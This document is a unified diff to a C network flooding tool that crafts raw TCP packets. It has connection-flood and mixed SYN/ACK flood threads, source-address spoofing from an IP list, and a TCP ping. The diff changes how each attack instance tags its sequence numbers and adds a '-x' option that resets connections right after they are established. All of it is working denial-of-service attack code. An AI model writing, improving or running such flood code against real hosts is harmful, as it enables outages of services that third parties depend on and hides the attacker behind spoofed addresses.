@@ -35,7 +35,7 @@ const char *hostname = NULL;
 uint32_t dest_addr = 0;
 uint16_t dest_port = 0;
 uint32_t sleep_interval = 10000;
-uint16_t action_uuid = 0;
+uint8_t action_uuid = 0;
 uint32_t run_time = 0;
 int action = TCP_PING;
 int num_threads = 1;
@@ -44,6 +44,7 @@ uint32_t spoof_addresses_size = 0;
 uint8_t *send_data = NULL;
 int send_data_size = 0;
 int quiet = 0;
+int drop_connections = 0;
 int use_tcp_options = 0;
 int fill_data_with_random = 0;
 
@@ -90,7 +91,7 @@ void *conn_flood_attack_thread(void *param)
         if(++src_port >= 61000)
             src_port = 1025;
         id = leef_random_byte() << 8 | leef_random_byte();
-        seq = action_uuid << 16 | id;
+        seq = (action_uuid << 24) | (id << 8) | leef_random_byte();
         leef_send_tcp_syn(&leef,
                           source_addr, dest_addr,
                           src_port, dest_port,
@@ -119,6 +120,7 @@ void conn_flood_sniff_thread()
     uint32_t ack_seq;
     uint32_t lastTicks;
     uint32_t ticksNow;
+    uint8_t flags;
     int syn_sent = 0;
     int synack_received = 0;
     int rst_received = 0;
@@ -181,21 +183,22 @@ void conn_flood_sniff_thread()
                packet.in_ip.tcp->source == dest_port) {
                 /* check if the packet was from this running attack instance */
                 if(packet.in_ip.tcp->ack == 1 &&
-                   action_uuid != ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16))
+                   action_uuid != ((packet.in_ip.tcp->ack_seq & 0xff000000) >> 24))
                     continue;
                 src_port = packet.in_ip.tcp->dest;
                 /* SYN+ACK */
                 if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
-                    id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
+                    id = (((packet.in_ip.tcp->ack_seq - 1) & 0xffff00) >> 8) + 1;
                     seq = packet.in_ip.tcp->ack_seq;
                     ack_seq = packet.in_ip.tcp->seq + 1;
 
                     if(send_data_size > 0) {
+                        flags = TCP_ACK | TCP_PUSH;
                         leef_send_raw_tcp2(&leef,
                                            source_addr, dest_addr,
                                            src_port, dest_port,
                                            id, seq, ack_seq,
-                                           TCP_ACK | TCP_PUSH,
+                                           flags,
                                            send_data_size,
                                            get_send_data());
                         tx_bytes += 54 + send_data_size;
@@ -244,16 +247,29 @@ void conn_flood_sniff_thread()
                         alive_connections--;
                         conn_ports[src_port] = 0;
                     }
+                /* ACK, drop connection if enabled */
+                } else if(packet.in_ip.tcp->ack == 1 && drop_connections) {
+                    seq = packet.in_ip.tcp->ack_seq;
+                    id = (((packet.in_ip.tcp->ack_seq - 2) & 0xffff00) >> 8) + 2;
+                    ack_seq = packet.in_ip.tcp->seq + 1;
+                    flags = TCP_ACK | TCP_RST;
+                    leef_send_raw_tcp2(&leef,
+                                       source_addr, dest_addr,
+                                       src_port, dest_port,
+                                       id, seq, ack_seq,
+                                       flags,
+                                       0,
+                                       NULL);
                 }
             /* check if the packet is to the host */
             } else if(packet.ip->protocol == IPPROTO_TCP &&
                       packet.ip->saddr == source_addr &&
                       packet.ip->daddr == dest_addr &&
                       packet.in_ip.tcp->dest == dest_port &&
-                      packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
-                if(action_uuid != ((packet.in_ip.tcp->seq & 0xffff0000) >> 16))
-                    continue;
-                syn_sent++;
+                      action_uuid == ((packet.in_ip.tcp->seq & 0xff000000) >> 24) &&
+                      (packet.in_ip.tcp->rst == 1 || (packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0))) {
+                if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0)
+                    syn_sent++;
                 tx_bytes += 54;
                 if(conn_ports[packet.in_ip.tcp->source] == 1) {
                     conn_ports[packet.in_ip.tcp->source] = 0;
@@ -390,7 +406,7 @@ void *mix_flood_attack_thread(void *param)
                 leef_send_tcp_syn(&leef,
                                 get_src_ip(), dest_addr,
                                 leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
-                                leef_random_u16(), action_uuid << 16 | leef_random_u16(),
+                                leef_random_u16(), leef_random_u32(),
                                 use_tcp_options);
                 break;
             case 1: /* ACK */
@@ -524,7 +540,7 @@ void *tcp_ping_thread(void *param)
             leef_send_tcp_syn(&leef,
                               source_addr, dest_addr,
                               src_port, dest_port,
-                              leef_random_u16(), action_uuid << 16 | leef_random_u16(),
+                              leef_random_u16(), (action_uuid << 24) | (leef_random_u16() << 8) | leef_random_byte(),
                               use_tcp_options);
             sent++;
             ping_ports[src_port] = ticksNow;
@@ -537,7 +553,7 @@ void *tcp_ping_thread(void *param)
             if(packet.ip->protocol == IPPROTO_TCP &&
                packet.ip->saddr == dest_addr &&
                packet.in_ip.tcp->source == dest_port &&
-               action_uuid == ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16)) {
+               action_uuid == ((packet.in_ip.tcp->ack_seq & 0xff000000) >> 24)) {
                 /* got a ping reply */
                 if(ping_ports[packet.in_ip.tcp->dest] != 0) {
                     rtt = (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]);
@@ -616,6 +632,7 @@ void print_help(char **argv)
     printf("  -f [text file]    - Read a list of IPs from a text file for spoofing\n");
     printf("  -o                - Enable tcp options on SYN packets\n");
     printf("  -q                - Quiet, don't print statistics output\n");
+    printf("  -x                - Drop connection after establishing it\n");
     printf("  --help            - Print this help\n");
 }
 
@@ -637,7 +654,7 @@ int main(int argc, char **argv)
     /* generate attack uuid */
     static struct timeval tv;
     gettimeofday(&tv, 0);
-    action_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xffff;
+    action_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xff;
 
     /* handle options */
     int arg;
@@ -783,6 +800,9 @@ int main(int argc, char **argv)
                     send_data_size = atoi(argv[++arg]);
                     send_data = (uint8_t *)malloc(send_data_size);
                     fill_data_with_random = 1;
+                    break;
+                case 'x':
+                    drop_connections = 1;
                     break;
                 default:
                     fprintf(stderr, "incorrect option %s, see --help\n", opt);
